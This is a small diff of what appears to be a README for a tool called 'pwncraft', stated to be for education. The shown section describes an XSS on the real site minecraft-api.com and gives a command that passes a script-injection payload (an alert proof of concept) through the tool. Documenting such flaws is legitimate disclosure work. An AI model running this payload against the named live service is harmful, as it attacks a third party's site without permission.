@@ -14,6 +14,7 @@ Made for educational purpose, for preventing people from getting attacked by thi
 ### XSS on https://minecraft-api.com
 
 - `https://minecraft-api.com/api/ping/YOUR_IP/YOUR_PORT`
+
 - `./pwncraft localhost 1337 -d '<script>alert("XSS !");</script>'`
 
 ## Credits
